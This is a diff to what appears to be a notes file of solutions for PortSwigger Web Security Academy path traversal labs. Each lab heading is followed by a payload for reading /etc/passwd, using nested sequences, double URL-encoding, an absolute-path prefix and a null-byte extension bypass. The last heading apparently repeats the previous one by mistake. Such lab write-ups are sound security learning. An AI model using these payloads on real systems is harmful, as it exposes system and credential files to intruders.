@@ -43,3 +43,37 @@ payload:
 https://0aa1006204c2baa2817a3e83008100b9.web-security-academy.net/image?filename=....//....//....//etc/passwd
 
 
+<br><br>
+<hr>
+<br><br>
+<h2>Lab: File path traversal, traversal sequences stripped with superfluous URL-decode</h2>
+
+payload:
+..%252f..%252f..%252fetc/passwd
+
+
+
+<br><br>
+<hr>
+<br><br>
+<h2>Lab: File path traversal, validation of start of path</h2>
+
+payload:
+/var/www/images/../../../etc/passwd
+
+<img width="1035" height="674" alt="image" src="https://github.com/user-attachments/assets/489fec63-69be-4562-8cdb-3b88a9e8c3db" />
+
+
+
+<br><br>
+<hr>
+<br><br>
+<h2>Lab: File path traversal, validation of start of path</h2>
+
+payload:
+../../../etc/passwd%00.png
+
+
+
+
+
